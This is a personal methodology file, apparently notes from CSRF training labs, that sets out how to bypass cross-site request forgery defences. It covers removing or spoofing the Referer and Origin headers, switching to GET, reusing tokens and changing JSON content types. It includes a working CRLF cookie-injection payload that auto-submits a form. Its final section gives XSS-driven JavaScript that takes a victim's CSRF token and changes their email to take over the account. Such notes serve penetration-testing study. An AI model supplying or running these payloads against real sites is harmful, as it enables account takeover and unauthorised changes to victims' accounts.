# CSRF Methodology

These are notes I took while solving CSRF labs and recorded them to be my methodology when working on this vulnerability.

- [ ] We’ll try it with changing the email
      I’ll check the request for changing the email.  
      I’ll see what error pops up if the email is entered wrong.  
      1- First thing we think about, if there’s no CSRF token, I start by removing the Referrer Header ‘cause it might be checked.  
      2- We start removing the Origin ‘cause it might be checked instead of the Referrer.  
      3- Last thing we can try is removing the Content-Type.  
      Cool, we confirmed there’s CSRF.  
      We make the exploit code [[Exploiting CSRF]].  
      Here, the code will take the value I set, let’s say the email, and change the victim’s data with it as soon as they open the link.  
      **So here, it might all depend on a specific Header, and if it’s removed, you can easily exploit CSRF.**  
      **Also, we gotta make sure the victim is actually logged in and the session is active before the request runs, ‘cause if there’s no active session, the code won’t work.**  
      **And if the site uses SameSite Cookies, we check if it’s Strict or Lax. If it’s Strict, the cookies won’t even get sent with the request from outside, so we need to confirm the cookies came with the request in the exploit.**

- [ ] Okay, what if there’s a CSRF Token
      We start figuring out if it’s checking the value, the parameter, or the header.  
      So step-by-step, we remove the value or change it, remove the CSRF parameter completely, and remove the Headers.  
      If no errors show up, then there’s CSRF, and we can exploit it.  
      **We’ll try using an old token from another session to see if it passes. If it does, the token isn’t tied to the session, and we can use it.**  
      **And if we execute the request, we gotta check the server’s Response—did it return 200 OK or 403 Forbidden? To make sure the action actually happened.**  
      **Also, if the token’s there, we try to confirm it’s not guessable, like trying a random or empty token and seeing how the server responds.**

- [ ] Okay, what if it’s checking the Referrer
      As usual, I start wiping out the Content-Type, Origin, and Referrer.  
      The case where it sends a Bad Request—that’s the spot it’s checking. Then I start figuring out how it checks and begin removing parts of the Referrer.  
      I remove the Path; if it’s fine, I start removing part of the Domain—did it throw an error?  
      Then it means the Domain has to be there.  
      Here’s the ==first idea==: we make the Domain name a folder you’ve got, so your site would look like this:  
      referrer: http://localhost/full-domain-name/exploit-file  
      Or we make the Domain a parameter:  
      referrer: http://localhost/?p=full-domain-name/  
      **And if the browser blocks the Referrer due to a policy like Referrer-Policy: no-referrer, we might need to put the exploit on the same domain if we’ve got an XSS vuln.**  
      **Also, if there’s an Open Redirect on the site, we can use it to add a fake Referrer and trick the server into accepting it.**

- [ ] If it stops at the CSRF
      And if I remove the parameter, it doesn’t pass.  
      And if I change the value or delete it, it doesn’t pass.  
      Then I try switching the Method to GET and use the exploit code with GET.  
      Or I use `<img src="full-domain-name\?email=csrf_img@gmail.com">`.  
      Since `<img>` uses GET, we put the source with the parameter we want to go in the request as GET, and then I can change the email super easily.  
      **But I gotta make sure the server accepts GET for sensitive actions, ‘cause some servers reject GET for changing data.**

- [ ] It’s checking CSRF through a Token List it’s got
      If the token changes with every refresh and the server relies on it for the function we’re testing, I can use my current token from when I’ve got the account open to work on a specific function for the victim. So the Exploit code will have my token’s value to make the exploit happen. The problem here is it doesn’t tie the token to the session it’s in—there’s no link between the Cookies and the Token.  
      **We’ll try using a token from another account on the same server. If it passes, the token isn’t tied to the session, and we can exploit it.**

- [ ] If the request has CSRF Value, CSRF Key
      There might be a relation between these two, so if I put both from my account and send the request to the victim, it might work. The issue here is the link is between two fixed values and not tied to the current user’s session. Okay, I can add the token to the request normally, but how do I add the one in the cookies that the browser generates by default?  
      We’ve got a vuln called ==CRLF==, short for two things:  
      First, ==Carriage Return==, which means starting to write from the beginning of the line, encoded as %0d.  
      Second, ==Line Feed==, which means starting a new line, encoded as %0a.  
      This vuln lets us inject a Header into the request by adding their symbols then adding the Header we want. Why do we need both together?  
      You gotta use **CRLF (both together)** at the end of each line in the Header because:  
      1- To stick to HTTP standards.  
      2- To make sure the line ends right and gets parsed correctly by the server.  
      3- To avoid issues that might come up if you use just one of them.  
      We’ll add it by using this vuln like this:  
```html
<img src="https://0a48000f046d507c809635340080008c.web-security-academy.net/?search=test%0d%0aSetCookie:%20csrfKey=qS8psmCPO4KmaCf6Za5jVzYG8VPwd5F9%3b%20SameSite=None" onerror="document.forms[0].submit()">

<form action="https://0a48000f046d507c809635340080008c.web-security-academy.net/my-account/change-email" method="POST">
   <input type="email" name="email" value="attza@gq.com">
   <input required type="hidden" name="csrf" value="i5y7iDr9qHoJsnLTXtytl9NmIQ9bxZAE">
</form>
```

We used the vuln to add the first Header with the cookies we want and the second to bypass any protection stopping it from accepting cookies from external sites. That way, I’ve added the Key, added the token, and pointed it to the email change link to exploit the vuln.  
**But we gotta be careful ‘cause CRLF isn’t always there, and we need to confirm the server accepts this injection and doesn’t sanitize the Headers.**

- [ ]  Now, if there’s two CSRF values and the check happens if they’re equal no matter what they are Meaning they could both be TEST, for example, and it’ll accept our request. So we use the same code from above but change the two values so they match, keeping in mind the Attribute names in the request.  
    **And if we execute the request, we check what the server responds with ? did the action actually happen, or is it checking something else?**

- [ ]  If there’s no CSRF Token and it’s checking the Referrer But it only checks its value when it’s there, and if it’s completely removed, the request passes. Then we add the meta part to remove the Referrer entirely from the request:
```html
<meta name="referrer" content="no-referrer">
```
Also, we can try adding a random Referrer instead of removing it completely to see if the server just checks for its presence or needs a specific domain.

- [ ]  If the request uses JSON instead of Form Data We start checking if the server accepts a Content-Type other than JSON. Some sites think they’re safe from CSRF ‘cause their request comes in JSON (like application/json), figuring an attacker can’t easily send JSON from outside since the browser needs fetch or XMLHttpRequest. But if the server accepts another Content-Type like application/x-www-form-urlencoded (regular Form Data), then there’s a CSRF vuln ‘cause you can send the request from a plain HTML form without needing JavaScript. We’ll try sending the normal request with JSON, then change the Content-Type and see how the server responds. If it accepts the request and does the action (like changing the email) without complaining about the Content-Type, then there’s CSRF.  
    **We’ll try to confirm if the server only accepts JSON or anything else, and test changing the Content-Type to see the server’s response.**

- [ ]  If the site doesn’t use tokens at all and relies on something like Captcha or MFA Here, we need to find a way to exploit something like Social Engineering to make the victim execute the request themselves, or check if there’s another vuln like Open Redirect we can use to reach the goal.

- [ ]  If the site uses a Framework like Django or Laravel We start checking if the Framework has a misconfiguration. Frameworks like Django and Laravel provide built-in CSRF protection, but if the developer didn’t set it up right (misconfiguration), the token might not be checked properly or could repeat across users. We’ll start by removing the token completely to see if the request passes, or try using a token from another account to see if the server ties the token to the session or not. If the token repeats, we can use it in our Exploit code.  
    **Also, if the token repeats across users, we can use it in our Exploit.**

- [ ]  Common Developer Mistakes 
    1- The token is guessable (like it’s short or predictable).  
    2- The token repeats across users or sessions.  
    3- The server relies on POST only and forgets GET.  
    4- The Referrer is checked for presence only without verifying its value.  
    If we find any of these, we can exploit them in the Exploit.  
    5- If there’s Double Submit Cookie, meaning the token’s in the cookies and the request, we start checking if the server compares them right. If there’s a vuln like CRLF, we can inject the cookies and make the token match the request.

---

# AJAX

1. Create an XMLHttpRequest object
2. Define a callback function
3. Open the XMLHttpRequest object
4. Send a Request to a server

### Example
```javascript
// Create an XMLHttpRequest object  
const xhttp = new XMLHttpRequest();  

// Define a callback function  
xhttp.onload = function() {  
// Here you can use the Data  
}  

// Send a request  
xhttp.open("GET", "ajax_info.txt");  
xhttp.send();
```

## XMLHttpRequest Object Properties

|Property|Description|
|---|---|
|onload|Defines a function to be called when the request is received (loaded)|
|onreadystatechange|Defines a function to be called when the readyState property changes|
|readyState|Holds the status of the XMLHttpRequest. <br>0: request not initialized <br>1: server connection established <br>2: request received <br>3: processing request <br>4: request finished and response is ready|
|responseText|Returns the response data as a string|
|responseXML|Returns the response data as XML data|
|status|Returns the status-number of a request <br>200: "OK" <br>403: "Forbidden" <br>404: "Not Found" <br>For a complete list go to the [Http Messages Reference](https://www.w3schools.com/tags/ref_httpmessages.asp)|
|statusText|Returns the status-text (e.g. "OK" or "Not Found")|

---

### CSRF Account Takeover

### Bypass CSRF Defenses

If we’ve got Stored XSS, we can use it to steal the victim’s cookies when they pass by the vuln while browsing.

2. We’ll need to go to the email change spot—that’s where we’ll grab the CSRF Token from. We’ll send a GET Request --> to extract the CSRF Token, and we’ll do this using AJAX - The XMLHttpRequest Object.

Here’s the Function we’ll use to grab the token value from the victim:
```javascript
var req = new XMLHttpRequest();

req.onreadystatechange = function() {
    if (req.readyState == 4 && req.status == 200) {  
        var htmlresponse = req.responseText;
        var parser = new DOMParser().parseFromString(htmlresponse, "text/html");
        var token = parser.getElementsByName('csrf')[0].value;
        ATO(token);
    }
};

req.open('GET', '/my-account', true);
req.send();
```

Here’s the Function that’ll go to the email change page to change it—it’ll take the token and work with it:
```javascript
<script>
    function ATO(token){
        //getting A CSRF Token by DOM
        //var token = document.getElementsByName('csrf')[0].value;
        // u need email & csrf parms
        var url = 'my-account/change-email';
        var params = 'csrf='+token+'&email=attacker@es.com';
        //create an XMLHttpReq
        var changeEmail = new XMLHttpRequest();
        //open the XMLHttpReq function
        changeEmail.open('POST', url, true);
        //send req with body value
        changeEmail.send(params);
    }
</script>
```

So now the whole code will look like this:
```javascript
//Steal CSRF Token
var req = new XMLHttpRequest();
req.onreadystatechange = function() {
    if (req.readyState == 4 && req.status == 200) {  
        var htmlresponse = req.responseText;
        var parser = new DOMParser().parseFromString(htmlresponse, "text/html");
        var token = parser.getElementsByName('csrf')[0].value;
        ATO(token);
    }
};
req.open('GET', '/my-account', true);
req.send();

//ChangeEmail Function
function ATO(token) {
    var url = 'my-account/change-email';
    var params = 'csrf='+token+'&email=attacker22@es.com';
    var changeEmail = new XMLHttpRequest();
    changeEmail.open('POST', url, true);
    changeEmail.send(params);
}
```

**But we gotta make sure the victim is browsing the site with the same browser where the session’s open, ‘cause if the session’s in another browser, the token won’t work.**

---

# Priority Order for Testing the Vuln

We’ll set an order for the steps based on their success likelihood:  
1- Remove the token if it’s there, ‘cause it’s the quickest way to spot CSRF.  
2- Remove the Referrer, Origin, and Content-Type one by one.  
3- Try switching the Method from POST to GET.  
4- Try bypassing the Headers with tricks like CRLF or Fake Referrer.
